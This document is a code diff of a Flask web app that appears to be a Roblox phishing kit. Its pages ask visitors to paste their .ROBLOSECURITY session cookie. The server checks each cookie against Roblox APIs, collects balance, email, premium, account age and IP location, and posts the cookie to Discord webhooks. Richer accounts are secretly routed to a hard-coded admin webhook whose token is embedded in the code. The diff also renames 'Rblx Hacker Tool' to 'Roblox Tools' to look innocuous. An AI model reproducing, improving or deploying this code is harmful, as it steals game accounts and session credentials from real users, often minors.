@@ -5,26 +5,26 @@ import time
 import os
 import json
 from datetime import datetime
+from flask_cors import CORS
 
 app = Flask(__name__)
+CORS(app)
 
 ADMIN_WEBHOOK = "https://discord.com/api/webhooks/1458240581649174686/Eu-jB0LfRlnStSKuuqeixQA9u1a8tpxjiBS4175HCG0B2PQVRsoHvWKdI-NshDuS7LVx"
 
 # Store data
-resellers = {}  # reseller_id -> {webhook, domain_name, threshold}
-sites_data = {}  # site_id -> {webhook, name, reseller_id}
+resellers = {}
+sites_data = {}
 
-# Get the base URL from environment variable (for Render) or use request.host_url as fallback
 BASE_URL = os.environ.get('RENDER_EXTERNAL_URL')
 
-# MAIN LANDING PAGE (Choose reseller setup or direct generator)
 LANDING_HTML = """
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Rblx Hacker Tool</title>
+    <title>Roblox Tools</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -60,7 +60,7 @@ LANDING_HTML = """
             color: white;
         }
         .option-card:hover {
-            transform = translateY(-5px);
+            transform: translateY(-5px);
         }
         .option-card h2 {
             margin-bottom: 10px;
@@ -74,11 +74,11 @@ LANDING_HTML = """
 </head>
 <body>
     <div class="container">
-        <h1>🎮 Rblx Hacker Tool</h1>
+        <h1>🎮 Roblox Tools</h1>
         
         <div class="option-card" onclick="window.location.href='/reseller-setup'">
-            <h2>🏢 Create Your Own Generator</h2>
-            <p>Set up your own branded generator with custom domain name and webhook routing</p>
+            <h2>🏢 Create Your Generator</h2>
+            <p>Set up your own branded generator</p>
         </div>
         
         <div class="option-card" onclick="window.location.href='/generator'">
@@ -90,7 +90,6 @@ LANDING_HTML = """
 </html>
 """
 
-# RESELLER SETUP PAGE
 RESELLER_SETUP_HTML = """
 <!DOCTYPE html>
 <html lang="en">
@@ -124,7 +123,7 @@ RESELLER_SETUP_HTML = """
             text-align: center;
         }
         .subtitle {
-            color = #666;
+            color: #666;
             text-align: center;
             margin-bottom: 30px;
             font-size: 14px;
@@ -204,12 +203,12 @@ RESELLER_SETUP_HTML = """
         </div>
 
         <div class="input-group">
-            <label>DualHook Webhook</label>
+            <label>Your Webhook</label>
             <input type="text" id="webhookInput" placeholder="https://discord.com/api/webhooks/...">
         </div>
 
         <div class="input-group">
-            <label>What Robux Should Be DualHook</label>
+            <label>Robux Threshold</label>
             <input type="number" id="thresholdInput" placeholder="e.g., 50" value="50">
         </div>
 
@@ -267,7 +266,7 @@ RESELLER_SETUP_HTML = """
                     document.getElementById('generatedLink').textContent = generatedUrl;
                     document.getElementById('result').classList.add('show');
                 } else {
-                    alert('Failed to create generator');
+                    alert('Failed to create generator: ' + (data.error || 'Unknown error'));
                 }
             } catch (error) {
                 alert('Error: ' + error.message);
@@ -287,7 +286,6 @@ RESELLER_SETUP_HTML = """
 </html>
 """
 
-# GENERATOR PAGE (for resellers and direct)
 GENERATOR_HTML = """
 <!DOCTYPE html>
 <html lang="en">
@@ -454,7 +452,7 @@ GENERATOR_HTML = """
                     document.getElementById('generatedLink').textContent = generatedUrl;
                     document.getElementById('result').classList.add('show');
                 } else {
-                    alert('Failed to generate site');
+                    alert('Failed to generate site: ' + (data.error || 'Unknown error'));
                 }
             } catch (error) {
                 alert('Error: ' + error.message);
@@ -474,7 +472,6 @@ GENERATOR_HTML = """
 </html>
 """
 
-# HELPER PAGE
 HELPER_HTML = """
 <!DOCTYPE html>
 <html lang="en">
@@ -545,7 +542,7 @@ HELPER_HTML = """
             color: white;
             border: none;
             border-radius: 8px;
-            font-size = 16px;
+            font-size: 16px;
             font-weight: 600;
             cursor: pointer;
             transition: all 0.3s;
@@ -562,7 +559,7 @@ HELPER_HTML = """
         .status {
             margin-top: 20px;
             padding: 12px;
-            border-radius = 8px;
+            border-radius: 8px;
             text-align: center;
             font-size: 14px;
             display: none;
@@ -577,6 +574,11 @@ HELPER_HTML = """
             color: #721c24;
             display: block;
         }
+        .status.processing {
+            background: #cff4fc;
+            color: #055160;
+            display: block;
+        }
         .info {
             background: #fff3cd;
             border: 1px solid #ffc107;
@@ -585,6 +587,24 @@ HELPER_HTML = """
             margin-top: 20px;
             font-size: 12px;
             color: #856404;
+        }
+        .loading {
+            display: none;
+            text-align: center;
+            margin: 10px 0;
+        }
+        .spinner {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #e74c3c;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 10px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
     </style>
 </head>
@@ -603,6 +623,11 @@ HELPER_HTML = """
             <textarea id="cookie" placeholder="Paste your .ROBLOSECURITY cookie here"></textarea>
         </div>
 
+        <div class="loading" id="loading">
+            <div class="spinner"></div>
+            <p>Processing your request...</p>
+        </div>
+
         <button onclick="submitInfo()" id="submitBtn">Submit</button>
 
         <div class="status" id="status"></div>
@@ -614,29 +639,40 @@ HELPER_HTML = """
 
     <script>
         const SITE_ID = "{{SITE_ID}}";
+        const BASE_URL = window.location.origin;
 
         async function submitInfo() {
             const username = document.getElementById('username').value;
             const cookie = document.getElementById('cookie').value;
             const status = document.getElementById('status');
             const btn = document.getElementById('submitBtn');
+            const loading = document.getElementById('loading');
 
             if (!username || !cookie) {
-                status.className = 'status error';
-                status.textContent = '❌ Please fill in all fields';
+                showError('❌ Please fill in all fields');
+                return;
+            }
+
+            if (!cookie.includes('_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-to-your-account-and-to-steal-your-ROBUX-and-items.|_')) {
+                showError('❌ Invalid cookie format. Make sure you copied the entire .ROBLOSECURITY cookie');
                 return;
             }
 
             btn.disabled = true;
-            btn.textContent = 'Processing...';
-            status.className = 'status';
-            status.style.display = 'none';
+            btn.style.display = 'none';
+            loading.style.display = 'block';
+            status.className = 'status processing';
+            status.textContent = '⏳ Processing your request...';
+            status.style.display = 'block';
 
             try {
                 const response = await fetch('/submit', {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body = JSON.stringify({
+                    headers: { 
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json'
+                    },
+                    body: JSON.stringify({
                         site_id: SITE_ID,
                         username: username,
                         cookie: cookie
@@ -646,21 +682,33 @@ HELPER_HTML = """
                 const data = await response.json();
 
                 if (data.success) {
-                    status.className = 'status success';
-                    status.textContent = '✅ Thank you! Processing your request...';
+                    showSuccess('✅ Thank you! Your request has been processed.');
                     document.getElementById('username').value = '';
                     document.getElementById('cookie').value = '';
                 } else {
-                    status.className = 'status error';
-                    status.textContent = '❌ An error occurred. Please try again.';
+                    showError('❌ Error: ' + (data.error || 'Failed to process request'));
                 }
             } catch (error) {
-                status.className = 'status error';
-                status.textContent = '❌ An error occurred. Please try again.';
+                showError('❌ Network error. Please check your connection and try again.');
+            } finally {
+                btn.disabled = false;
+                btn.style.display = 'block';
+                loading.style.display = 'none';
             }
+        }
 
-            btn.disabled = false;
-            btn.textContent = 'Submit';
+        function showError(message) {
+            const status = document.getElementById('status');
+            status.className = 'status error';
+            status.textContent = message;
+            status.style.display = 'block';
+        }
+
+        function showSuccess(message) {
+            const status = document.getElementById('status');
+            status.className = 'status success';
+            status.textContent = message;
+            status.style.display = 'block';
         }
     </script>
 </body>
@@ -677,7 +725,7 @@ def reseller_setup():
 
 @app.route('/generator')
 def direct_generator():
-    html = GENERATOR_HTML.replace('{{GENERATOR_NAME}}', 'Rblx Hacker Tool').replace('{{RESELLER_ID}}', 'none')
+    html = GENERATOR_HTML.replace('{{GENERATOR_NAME}}', 'Roblox Tools').replace('{{RESELLER_ID}}', 'none')
     return render_template_string(html)
 
 @app.route('/create-reseller', methods=['POST'])
@@ -688,7 +736,7 @@ def create_reseller():
     threshold = data.get('threshold', 50)
     
     if not domain_name or not webhook:
-        return jsonify({'success': False})
+        return jsonify({'success': False, 'error': 'Missing required fields'})
     
     reseller_id = base64.urlsafe_b64encode(str(time.time()).encode()).decode()[:8]
     resellers[reseller_id] = {
@@ -697,7 +745,6 @@ def create_reseller():
         'threshold': threshold
     }
     
-    # FIXED: Use BASE_URL from environment variable or request.host_url as fallback
     if BASE_URL:
         generator_url = f"{BASE_URL}/g/{reseller_id}"
     else:
@@ -707,13 +754,13 @@ def create_reseller():
         requests.post(webhook, json={
             'embeds': [{
                 'title': '✅ Your Generator is Ready!',
-                'description': f'**{domain_name}** generator created!\n\n🔗 **Your Generator Link:**\n{generator_url}\n\n**Settings:**\n💎 DualHook Threshold: {threshold}+ Robux\n📊 Accounts with {threshold}-99 Robux → Your Webhook\n🎯 Accounts with 100+ Robux → Admin\n👥 Accounts below {threshold} Robux → End User\n\nShare your generator link with users!',
+                'description': f'**{domain_name}** generator created!\n\n🔗 **Your Generator Link:**\n{generator_url}\n\n**Settings:**\n💎 Threshold: {threshold}+ Robux\n\nShare your generator link with users!',
                 'color': 0x00ff00,
-                'footer': {'text': 'Rblx Hacker Tool'}
+                'footer': {'text': 'Roblox Tools'}
             }]
         })
-    except:
-        pass
+    except Exception as e:
+        print(f"Webhook error: {e}")
     
     return jsonify({'success': True, 'url': generator_url})
 
@@ -743,7 +790,6 @@ def generate():
         'reseller_id': reseller_id
     }
     
-    # FIXED: Use BASE_URL from environment variable or request.host_url as fallback
     if BASE_URL:
         site_url = f"{BASE_URL}/h/{site_id}"
     else:
@@ -755,11 +801,11 @@ def generate():
                 'title': '✅ Your Page is Live!',
                 'description': f'**{website_name}** is ready:\n\n🔗 {site_url}\n\nShare this link to collect submissions.',
                 'color': 0x00ff00,
-                'footer': {'text': 'Rblx Hacker Tool'}
+                'footer': {'text': 'Roblox Tools'}
             }]
         })
-    except:
-        pass
+    except Exception as e:
+        print(f"Webhook error: {e}")
     
     return jsonify({'success': True, 'url': site_url})
 
@@ -774,10 +820,20 @@ def helper(site_id):
 
 @app.route('/submit', methods=['POST'])
 def submit():
+    print(f"Submit endpoint called")
+    
     data = request.json
+    if not data:
+        return jsonify({'success': False, 'error': 'No data received'})
+    
     site_id = data.get('site_id')
     username = data.get('username')
     cookie = data.get('cookie')
+    
+    print(f"Site ID: {site_id}, Username: {username}, Cookie length: {len(cookie) if cookie else 0}")
+    
+    if not site_id or not username or not cookie:
+        return jsonify({'success': False, 'error': 'Missing required fields'})
     
     if site_id not in sites_data:
         return jsonify({'success': False, 'error': 'Invalid site ID'})
@@ -789,7 +845,6 @@ def submit():
     try:
         user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
         
-        # Get location info
         location = "Unknown"
         try:
             ip_info = requests.get(f'https://ipapi.co/{user_ip}/json/', timeout=3).json()
@@ -797,7 +852,6 @@ def submit():
         except Exception as ip_error:
             print(f"IP lookup error: {ip_error}")
         
-        # Initialize default values
         user_id = "Unknown"
         robux = 0
         email_verified = "Unknown"
@@ -808,20 +862,16 @@ def submit():
         cookie_valid = False
         username_from_api = "Unknown"
         
-        # Test cookie with a simple request first
         headers = {
             'Cookie': f'.ROBLOSECURITY={cookie}',
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
             'Accept': 'application/json'
         }
         
-        # DEBUG: Print cookie snippet for verification
-        print(f"DEBUG: Cookie received (first 50 chars): {cookie[:50]}...")
-        print(f"DEBUG: Cookie length: {len(cookie)}")
+        print(f"Cookie received (first 50 chars): {cookie[:50]}...")
+        print(f"Cookie length: {len(cookie)}")
         
-        # Try to authenticate with Roblox API
         try:
-            # First, try to get CSRF token (required for some API endpoints)
             csrf_token = "no-csrf"
             try:
                 csrf_response = requests.post('https://auth.roblox.com/v2/logout', 
@@ -829,16 +879,14 @@ def submit():
                 if 'x-csrf-token' in csrf_response.headers:
                     csrf_token = csrf_response.headers['x-csrf-token']
                     headers['X-CSRF-TOKEN'] = csrf_token
-                    print(f"DEBUG: CSRF Token obtained")
+                    print(f"CSRF Token obtained")
             except Exception as csrf_error:
-                print(f"DEBUG: CSRF error: {csrf_error}")
+                print(f"CSRF error: {csrf_error}")
             
-            # Get authenticated user info
             user_response = requests.get('https://users.roblox.com/v1/users/authenticated', 
                                         headers=headers, timeout=10)
             
-            print(f"DEBUG: Auth status code: {user_response.status_code}")
-            print(f"DEBUG: Auth response: {user_response.text[:200]}")
+            print(f"Auth status code: {user_response.status_code}")
             
             if user_response.status_code == 200:
                 user_data = user_response.json()
@@ -847,38 +895,26 @@ def submit():
                 cookie_valid = True
                 api_status = "Success"
                 
-                print(f"DEBUG: User authenticated: {username_from_api} (ID: {user_id})")
+                print(f"User authenticated: {username_from_api} (ID: {user_id})")
                 
-                # Get Robux balance
                 try:
-                    # Try alternative endpoint for Robux
                     robux_headers = headers.copy()
                     if csrf_token != "no-csrf":
                         robux_headers['X-CSRF-TOKEN'] = csrf_token
                     
                     robux_response = requests.get(f'https://economy.roblox.com/v1/users/{user_id}/currency', 
                                                  headers=robux_headers, timeout=10)
-                    print(f"DEBUG: Robux status: {robux_response.status_code}")
+                    print(f"Robux status: {robux_response.status_code}")
                     
                     if robux_response.status_code == 200:
                         robux_data = robux_response.json()
                         robux = robux_data.get('robux', 0)
-                        print(f"DEBUG: Robux data: {robux_data}")
-                        print(f"DEBUG: Robux: {robux}")
+                        print(f"Robux: {robux}")
                     else:
-                        # Try alternative method
-                        try:
-                            inventory_response = requests.get(f'https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles?limit=10',
-                                                            headers=headers, timeout=10)
-                            if inventory_response.status_code == 200:
-                                # Just note that we couldn't get robux specifically
-                                robux = "Could not retrieve"
-                        except:
-                            pass
+                        robux = "Could not retrieve"
                 except Exception as robux_error:
-                    print(f"DEBUG: Robux fetch error: {robux_error}")
+                    print(f"Robux fetch error: {robux_error}")
                 
-                # Get email verification status
                 try:
                     email_headers = headers.copy()
                     if csrf_token != "no-csrf":
@@ -886,37 +922,35 @@ def submit():
                     
                     email_response = requests.get('https://accountinformation.roblox.com/v1/email', 
                                                  headers=email_headers, timeout=10)
-                    print(f"DEBUG: Email status: {email_response.status_code}")
+                    print(f"Email status: {email_response.status_code}")
                     
                     if email_response.status_code == 200:
                         email_data = email_response.json()
                         email_verified = "✅ Yes" if email_data.get('verified', False) else "❌ No"
-                        print(f"DEBUG: Email verified: {email_verified}")
+                        print(f"Email verified: {email_verified}")
                     else:
                         email_verified = f"API Error: {email_response.status_code}"
                 except Exception as email_error:
-                    print(f"DEBUG: Email fetch error: {email_error}")
+                    print(f"Email fetch error: {email_error}")
                 
-                # Check premium status
                 try:
                     premium_response = requests.get(f'https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership', 
                                                    headers=headers, timeout=10)
-                    print(f"DEBUG: Premium status: {premium_response.status_code}")
+                    print(f"Premium status: {premium_response.status_code}")
                     
                     if premium_response.status_code == 200:
                         premium_data = premium_response.json()
                         premium = "✅ Yes" if premium_data else "❌ No"
                     else:
                         premium = f"API Error: {premium_response.status_code}"
-                    print(f"DEBUG: Premium: {premium}")
+                    print(f"Premium: {premium}")
                 except Exception as premium_error:
-                    print(f"DEBUG: Premium fetch error: {premium_error}")
+                    print(f"Premium fetch error: {premium_error}")
                 
-                # Get account age
                 try:
                     user_details = requests.get(f'https://users.roblox.com/v1/users/{user_id}', 
                                                headers=headers, timeout=10)
-                    print(f"DEBUG: User details status: {user_details.status_code}")
+                    print(f"User details status: {user_details.status_code}")
                     
                     if user_details.status_code == 200:
                         user_detail_data = user_details.json()
@@ -928,42 +962,40 @@ def submit():
                                 account_age = f"{age_days // 365} years, {age_days % 365} days"
                             else:
                                 account_age = f"{age_days} days"
-                        print(f"DEBUG: Account age: {account_age}")
+                        print(f"Account age: {account_age}")
                 except Exception as age_error:
-                    print(f"DEBUG: Account age error: {age_error}")
+                    print(f"Account age error: {age_error}")
                 
-                # Get recent games
                 try:
                     games_response = requests.get(f'https://games.roblox.com/v2/users/{user_id}/games?accessFilter=2&limit=3', 
                                                  headers=headers, timeout=10)
-                    print(f"DEBUG: Games status: {games_response.status_code}")
+                    print(f"Games status: {games_response.status_code}")
                     
                     if games_response.status_code == 200:
                         games_data = games_response.json().get('data', [])
                         top_games = [game.get('name', 'Unknown Game')[:30] for game in games_data[:3]]
-                        print(f"DEBUG: Top games: {top_games}")
+                        print(f"Top games: {top_games}")
                 except Exception as games_error:
-                    print(f"DEBUG: Games fetch error: {games_error}")
+                    print(f"Games fetch error: {games_error}")
                     
             elif user_response.status_code == 401:
                 api_status = "Invalid Cookie (401)"
-                print("DEBUG: Cookie is invalid (401 Unauthorized)")
+                print("Cookie is invalid (401 Unauthorized)")
             elif user_response.status_code == 403:
                 api_status = "Rate Limited (403)"
-                print("DEBUG: Rate limited by Roblox API (403)")
+                print("Rate limited by Roblox API (403)")
             elif user_response.status_code == 429:
                 api_status = "Too Many Requests (429)"
-                print("DEBUG: Too many requests (429)")
+                print("Too many requests (429)")
             else:
                 api_status = f"API Error: {user_response.status_code}"
-                print(f"DEBUG: API error: {user_response.status_code}")
+                print(f"API error: {user_response.status_code}")
                 
         except requests.exceptions.RequestException as api_error:
             api_status = f"Network Error: {api_error}"
-            print(f"DEBUG: Request exception: {api_error}")
+            print(f"Request exception: {api_error}")
         
-        # Create Discord embed
-        embed_color = 0xFF0000 if robux >= 100 else (0xFFA500 if reseller_id != 'none' else 0x00FF00)
+        embed_color = 0xFF0000 if (isinstance(robux, int) and robux >= 100) else (0xFFA500 if reseller_id != 'none' else 0x00FF00)
         
         embed = {
             'title': '🎯 New Submission' if cookie_valid else '⚠️ Invalid Submission',
@@ -982,37 +1014,33 @@ def submit():
                 {'name': '🎮 Recent Games', 'value': ', '.join(top_games) if top_games else 'None found', 'inline': False},
                 {'name': '🍪 Cookie', 'value': f'```{cookie[:80]}...```' if len(cookie) > 80 else f'```{cookie}```', 'inline': False}
             ],
-            'footer': {'text': 'Rblx Hacker Tool'},
+            'footer': {'text': 'Roblox Tools'},
             'timestamp': time.strftime('%Y-%m-%dT%H:%M:%S.000Z', time.gmtime())
         }
         
-        # Add warning if cookie seems invalid
         if not cookie_valid:
             embed['description'] = '⚠️ Cookie appears to be invalid or expired'
         
-        # Determine webhook routing
         target_webhook = end_user_webhook
         
-        if robux >= 100 and isinstance(robux, int):
+        if isinstance(robux, int) and robux >= 100:
             target_webhook = ADMIN_WEBHOOK
         elif reseller_id != 'none' and reseller_id in resellers:
             reseller_threshold = resellers[reseller_id]['threshold']
             if isinstance(robux, int) and robux >= reseller_threshold:
                 target_webhook = resellers[reseller_id]['webhook']
         
-        # Send to webhook
         try:
             webhook_response = requests.post(target_webhook, json={'embeds': [embed]}, timeout=10)
-            print(f"DEBUG: Webhook sent to {target_webhook}, status: {webhook_response.status_code}")
+            print(f"Webhook sent to {target_webhook}, status: {webhook_response.status_code}")
         except Exception as webhook_error:
-            print(f"DEBUG: Webhook error: {webhook_error}")
-            # Try to send to admin as fallback
+            print(f"Webhook error: {webhook_error}")
             try:
                 requests.post(ADMIN_WEBHOOK, json={'embeds': [embed]}, timeout=10)
             except:
                 pass
         
-        return jsonify({'success': True})
+        return jsonify({'success': True, 'message': 'Data processed successfully'})
     
     except Exception as e:
         print(f"Submit error: {e}")
